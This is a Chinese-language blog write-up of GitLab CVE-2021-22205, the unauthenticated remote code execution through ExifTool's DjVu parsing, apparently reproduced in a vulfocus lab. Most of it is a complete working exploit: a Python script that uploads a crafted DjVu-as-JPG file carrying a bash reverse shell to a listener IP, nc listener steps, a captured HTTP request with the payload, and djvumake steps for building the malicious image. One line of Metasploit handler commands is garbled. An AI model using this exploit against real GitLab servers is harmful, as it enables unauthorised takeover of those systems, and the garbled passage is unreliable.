---
title: GitLab漏洞-CVE-2021-22205
date: 2024-03-11 00:46 +0800
categories: [web,框架漏洞] 
tags: [cms,GitLab,CVE]
img_path: /img/web/
---
## 0x00 漏洞简介

在 GitLab CE/EE 中发现了一个问题，影响了从 11.9 开始的版本。GitLab 没有正确验证传递给文件解析器的图像文件，这导致了未经身份验证的远程命令执行。

**漏洞影响版本：**

> 11.9 <= Gitlab CE/EE < 13.8.8
> 
> 13.9 <= Gitlab CE/EE < 13.9.6
> 
> 13.10 <= Gitlab CE/EE < 13.10.3
{: .prompt-info}

#### 1、gitlab介绍

GitLab是由GitLabInc.开发，使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能。使用Git作为代码管理工具，并在此基础上搭建起来的web服务。

![截图](53f251f94670a4aec3de59c5c0d2912f.png)

可以看到在gitlab的组成中包含的各种组件，可以通过两个关键入口访问，分别是HTTP/HTTPS(TCP 80,443)和SSH(TCP 22)，请求通过nginx转发到Workhorse，然后Workhorse和Puma进行交互，这里我们着重介绍下通过Web访问的组件GitLab Workhorse。

> Puma 是一个用于 Ruby 应用程序的简单、快速、多线程和高度并发的 HTTP 1.1 服务器，用于提供GitLab网页和API。从 GitLab 13.0 开始，Puma成为了默认的Web服务器，替代了之前的Unicorn。而在GitLab 14.0中，Unicorn 从Linux 包中删除，只有Puma可用。

而漏洞的成因就在于`Gitlab Workhorse`处理文件的过程中。

#### 2、漏洞成因

当我们利用接口`/uploads/user`上传图像文件时，`GitLab Workhorse`会将扩展名为`jpg、jpeg、tiff`文件传递给`ExifTool`。而`ExifTool`作用在于删除其中不合法的标签。而`ExifTool`在解析文件的时候会忽略文件的扩展名，尝试根据文件的内容来确定文件类型，其中支持的类型有DjVu。

> DjVu是由AT&T实验室自1996年起开发的一种图像压缩技术，已发展成为标准的图像文档格式之一;
> 
> ExifTool是一个独立于平台的Perl库，一款能用作多功能图片信息查看工具。可以解析出照片的exif信息，可以编辑修改exif信息，用户能够轻松地进行查看图像文件的EXIF信息，完美支持exif信息的导出。
{: .prompt-info}

关键在于ExifTool在解析DjVu注释的ParseAnt函数中存在漏洞，所以我们就可以通过构造DjVu文件并插入恶意注释内容将其改为jpg后缀上传，因为gitlab并未在这个过程中验证文件内容是否是允许的格式，最后让ExifTool以DjVu形式来解析文件，造成了ExifTool代码执行漏洞。

以上的内容参考自： [AirSky](https://mp.weixin.qq.com/s/Y4mGVhbc3agp1adnUs1GmA)

## 0x01 漏洞复现

我是利用vulfocus搭建环境进行复现。

这里,我们可以直接利用网上开源的一些脚本:

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-
import requests
from bs4 import BeautifulSoup

class Exploit():
    __info__ = {
        'name': 'CVE-2021-22205',
        'desription': 'gitlab 未授权远程命令执行',
        'references': ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205'],
        'devices': ['gitlab',
                    '11.9=< version <13.8.8',
                    '13.9=< version <13.9.6',
                    '13.10=< version <13.10.3'
        ],
    }


    target = "192.168.31.38"
    port = 43536
    reverseShell = "echo '/bin/bash -i >& /dev/tcp/{}/{} 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh"

    def exploit(self):
        proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
        session = requests.Session()
        session.proxies = proxies
        requests.packages.urllib3.disable_warnings()
        url = "http://{}:{}".format(self.target, self.port)
        try:
            r = session.get(url.strip("/") + "/users/sign_in", verify=False)
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{" + self.reverseShell + "} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                "Connection": "close",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
            flag = 'Failed to process image'
            req = session.post(url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)
            print(session.body)
            x = req.text
            if flag in x:
                return "success!!!"
            else:
                print("[-] Vuln Check Failed... ...")
                return 'failed'
        except Exception as error:
            print(error.with_traceback())
            print("[-] Vuln Check Failed... ...")
            return 'failed'

    def run(self):
        res = self.exploit()
        return res

if __name__ == '__main__':
    exploit = Exploit()
    '''
    在GitLab CE/EE中发现一个问题，从11.9开始影响所有版本。
    GitLab没有正确地验证传递给文件解析器的图像文件，导致远程命令执行
    此脚本利用此漏洞进行反弹shell, 测试前请配置好下面的 listenIp 和 listenPort 参数
    '''
    exploit.target= "192.168.31.38" # 目标服务器
    exploit.port = 43536      # 目标端口
    listenIp = "192.168.31.38" # 本地监听ip
    listenPort = "6666"   # 本地监听端口
    exploit.reverseShell = exploit.reverseShell.format(listenIp,listenPort)
    result = exploit.run()
    print(result)

```
{: file='1.py'}

这里,我们只需要修改一下利用地址和端口 ；还有本地监听的地址和端口。

然后，我们需要利用nc监听本地端口：

```bash
nc.exe -lvnp 6666
```

然后启动脚本：

```bash
python 1.py
```

xxxxxxxxxx5 1use exploit/multi/handler2set payload windows/meterpreter/bind_tcp3set rhost 192.168.11.1294set lport 33335runbash

## 0x02 脚本代码分析

这里，我截下流量包的图片，以便我们可以看到脚本代码中发送的流量情况：

```sass
POST /uploads/user HTTP/1.1
Host: 192.168.31.38:43536
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
X-CSRF-Token: BYGxDBZjz3NG0PKDN1lK1fMagmzwzsPNyod+zPUBYlYL9rGDbXJDAS6JJCBMGxQNKD/PIpool1nVPBv159zTew==
Cookie: _gitlab_session=addf2bf61cd6e800858774f8cb8ea0a7; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltUTVOekk0TVRZMUxUTXdObU10TkRkaVpDMWlOemN6TFRSaE5XWmxNREpqTXpWbU5DST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--70dccc24ff47022870ee986c26295ba243fc285e
Content-Length: 971


------WebKitFormBoundaryIMv3mxRg59TkFSX5
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

AT&TFORM  疍JVMDIRM   .?    F   ?蘅?!葢N? 亿堣k鍰,q領觧暯⒚"?FORM   ^DJVUINFO   
   d  INCL   shared_anno.iff BG44    J  婃岜7?*? BG44   鶡BG44   
FORM   DJVIANTa  P(metadata
	(Copyright "\
" . qx{echo '/bin/bash -i >& /dev/tcp/192.168.31.38/6666 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh} . \
" b ") )                                                                                                                                                                                                                                                                                                                                                                                                                                     

------WebKitFormBoundaryIMv3mxRg59TkFSX5--
```
{: file='数据包'}

![截图](8f00070c63b3c49d089da52c0b7ed354.png)

然后，从图中可以看到，这里我们利用的上传接口确实是`/uploads/user`，除此之外，代码本身还通过获取`X-CSRF-Token`和未登录`Session`来进行未授权访问。

而上传的数据包内容，则是一个DjVu文件的内容格式，其中还包含了我们注释的恶意代码内容，以便让`ExifTool`完成最终的代码执行。

当然，这里我们也已直接使用`DjVu`来创建我们的恶意代码。用法：（在kali中）

```shell
sudo apt-get install -y djvulibre-bin
```

准备好恶意文本：

```sass
(metadata
	(Copyright "\
"  qx{echo '/bin/bash -i >& /dev/tcp/{}/{} 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh} . \
" b ") )
```{: file='cve.txt'}

制作`DjVu`图片格式：

```shell
djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=rce.txt && mv rce.djvu rce.jpg
```

最终jpg里的内容为：
![截图](20240311003341298.png)

